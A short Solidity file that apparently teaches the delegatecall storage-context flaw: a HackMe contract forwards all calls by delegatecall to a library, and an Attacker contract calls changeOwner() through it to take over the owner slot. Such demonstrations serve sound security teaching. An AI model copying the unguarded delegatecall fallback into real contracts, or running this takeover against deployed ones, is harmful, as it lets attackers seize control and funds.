// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.1;

// deligate call preserves context, if this is not taken care of contracts can be hacked

contract HackMe {
    address public owner;
    Lib _libContract;

    constructor(address _lib) {
        owner = msg.sender;
        _libContract = Lib(_lib);
    }

    fallback() external payable {
        address(_libContract).delegatecall(msg.data);
    }
}

contract Lib {
    address public owner;

    function changeOwner() external {
        owner = msg.sender;
    }
}

contract Attacker {
    address hackMe;

    constructor(address _hackMe) {
        hackMe = _hackMe;
    }

    function attack() external {
        hackMe.call(abi.encodeWithSignature("changeOwner()"));
    }
}
